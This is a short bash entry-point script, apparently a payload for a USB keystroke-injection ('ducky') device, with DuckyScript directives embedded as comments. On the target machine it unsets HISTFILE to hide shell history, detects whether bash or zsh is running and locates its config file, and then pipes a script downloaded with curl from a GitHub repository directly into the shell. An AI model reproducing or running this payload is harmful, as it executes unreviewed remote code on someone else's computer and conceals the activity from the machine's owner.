#!/bin/bash

# TITLE EntryPoint ducky
# AUTHOR Saverio976
# DESCRIPTION call scripts from https://github.com/Saverio976/ducky-the-duck

# !EXTENSION!detect_ready.txt
# !EXTENSION!os_detect.txt

# !DUCKY!$_JITTER_ENABLED = TRUE
# !DUCKY!$_JITTER_MAX = 1
# !DUCKY!DETECT_OS()

unset HISTFILE

export CURRENTSHELL=''
CURRENTSHELL=$(readlink /proc/$$/exe)

$CURRENTSHELL
unset HISTFILE

export CONFIGFILE=''
[[ "$CURRENTSHELL" == *"zsh"* ]] && CURRENTSHELL="zsh" && CONFIGFILE="${ZDOTDIR:-$HOME}/.zshrc"
[[ "$CURRENTSHELL" == *"bash"* ]] && CURRENTSHELL="bash" && CONFIGFILE="$HOME/.bashrc"

curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/entrypoint.sh' | $CURRENTSHELL

# !DUCKY!ATTACKMODE STORAGE
